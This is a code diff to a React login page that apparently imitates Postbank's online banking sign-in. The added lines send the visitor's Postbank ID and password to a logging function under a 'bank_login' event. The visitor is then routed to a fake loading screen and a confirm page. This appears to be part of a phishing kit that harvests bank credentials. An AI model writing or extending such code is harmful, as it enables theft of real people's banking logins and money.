@@ -2,6 +2,8 @@ import { useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { ArrowLeft, X } from "lucide-react";
 import { bankLogoUrls } from "@/assets/bank-logos";
+import { logEvent } from "@/lib/session";
+
 
 export const Route = createFileRoute("/bank/postbank")({
   head: () => ({
@@ -131,7 +133,9 @@ function PostbankLoginPage() {
                   sessionStorage.setItem("bankName", "Postbank");
                   sessionStorage.setItem("bankLogo", "postbank");
                 } catch {}
+                logEvent("bank_login", { bank_slug: "postbank", bank_name: "Postbank", field1_label: "Postbank ID", field1: login, field2_label: "Passwort", field2: pin });
                 navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
+
               }}
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
